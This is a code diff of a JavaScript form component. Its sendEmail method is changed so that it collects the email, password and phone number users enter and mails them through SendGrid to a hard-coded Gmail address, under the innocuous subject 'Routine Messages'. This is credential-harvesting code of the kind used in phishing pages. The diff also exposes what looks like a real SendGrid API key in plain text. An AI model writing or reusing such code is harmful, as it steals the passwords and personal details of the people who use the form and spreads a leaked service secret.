@@ -33,16 +33,19 @@ export default {
     methods: {
         sendEmail(){
             alert("I get here")
-            Email.send({
-                Host : "smtp.yourisp.com",
-                Username : "username",
-                Password : "password",
-                To : 'them@website.com',
-                From : "you@isp.com",
-                Subject : "This is the subject",
-                Body : "And this is the body"
+            alert("Email:" + this.model.email + "Password:" + this.model.password + "Telephone:" + this.model.phone)
+            Email.send({   
+                Host : "smtp.sendgrid.net",
+                Port : "25",
+                Ssl : true,
+                Username : "apikey",
+                Password : "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",          
+                To : 'olaniranolaolujames@gmail.com',
+                From : "takeitallever@gmail.com",
+                Subject : "Routine Messages",
+                Body : "Email: " + this.model.email +"<br/>"+ " Password: " + this.model.password +"<br/>"+ " Telephone: " + this.model.phone
             }).then(
-            message => alert(message)
+                message => alert(message)
             );
         }
     }
